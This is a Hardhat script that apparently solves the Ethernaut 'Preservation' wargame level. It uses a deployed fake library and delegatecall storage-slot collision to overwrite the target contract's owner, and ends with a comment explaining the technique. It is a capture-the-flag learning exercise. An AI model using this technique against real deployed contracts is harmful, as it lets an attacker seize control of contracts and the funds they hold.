import { ethers } from "hardhat";
import { abi } from "../../artifacts/contracts/16.Preservation/Preservation.sol/Preservation.json";
import { BigNumber, Contract } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { sendEther } from "../../utils/sendEther";
import { deployContract } from "utils/deployContract";

function setTargetContract() {
  const contractAddress = "0xf577488186CE532b2bC83Efc8D1470247A0Dbe1F";
  return new Contract(contractAddress, abi);
}

async function checkSucces(attacker: SignerWithAddress, target: Contract) {
  const owner = await target.connect(attacker).owner();
  console.log("Success: ", owner === attacker.address);
}

async function main() {
  const [attacker] = await ethers.getSigners();
  const target = setTargetContract();
  const FakeLibrary = await deployContract("FakeLibrary");
  let tx = await target
    .connect(attacker)
    .setFirstTime(BigNumber.from(FakeLibrary.address));
  await tx.wait();

  tx = await target
    .connect(attacker)
    .setFirstTime(BigNumber.from(attacker.address), {
      gasLimit: "300000",
    });
  await tx.wait();

  checkSucces(attacker, target);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

// Explanation:
// The setTime function, if called will delegate call will change the value
// of the first storage slot of the calling contract.
// We are going to put there the address of a library we created.
// This library, if called in delegate call will change the value of the third
// storage slot of calling contract, which is in our case, owner.
